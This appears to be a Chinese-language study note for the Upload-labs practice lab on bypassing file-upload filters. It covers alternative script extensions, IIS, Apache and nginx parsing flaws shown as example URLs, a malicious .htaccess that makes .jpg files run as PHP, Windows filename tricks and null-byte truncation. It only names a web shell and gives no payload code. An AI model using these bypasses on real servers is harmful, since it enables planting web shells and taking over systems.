

GO GO GO

## 思路脑图

![Upload-labs](../漏洞/imgs/Upload-labs.png)

## 后缀名解析

### 黑名单

- **生僻解析后缀**

```
后缀
====
asp => .aspx .asa .cer .cdx
jsp => .jspx .jspf
php => .php3 .php4 .phtml

大小写绕过比如：.aSp .pHp
```

### 解析漏洞

- **IIS 5.x - 6.x**

```
形式：http://www.xxx.com/xx.asp/xx.jpg
原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件
形式：http://www.xxx.com/xx.asp;.jpg
原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了
IIS6.0 默认的可执行文件除了asp还包含这三种 :
/test.asa /test.cer /test.cdx
```

- **Apache**

```
形式：http://www.xxxx.xxx.com/test.php.php123
其余配置问题导致漏洞
（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。
（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。
```

- **nginx**

```
漏洞形式:
http://www.xxxx.com/UploadFiles/p_w_picpath/1.jpg/1.php
http://www.xxxx.com/UploadFiles/p_w_picpath/1.jpg%00.php
http://www.xxxx.com/UploadFiles/p_w_picpath/1.jpg/%20\0.php
另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。
(IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo)
```

### 上传绕过

- **.htaccess**

```
文件作为局部变量作用文件成功作用的两个条件  #配置文件httpd.conf
1、Allow Override All
2、LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态
通过上传.htaccess文件,apache服务器会将所有.jpg为后缀的文件作为php文件解析
<Directory />
    Options FollowSymLinks
    AllowOverride All
    AddType application/x-httpd-php .jpg	#将.jpg后缀的文件作为PHP文件解析
</Directory>
```

- **上传不符合windows文件命名规则的文件名**

```
test.asp.
test.asp(空格)
test.php:1.jpg
test.php:: $DATA
会被windows系统自动去掉不符合规则符号后面的内容
```

- **0x00 截断**

```
假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00 符合了c语言的特性) 而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg
```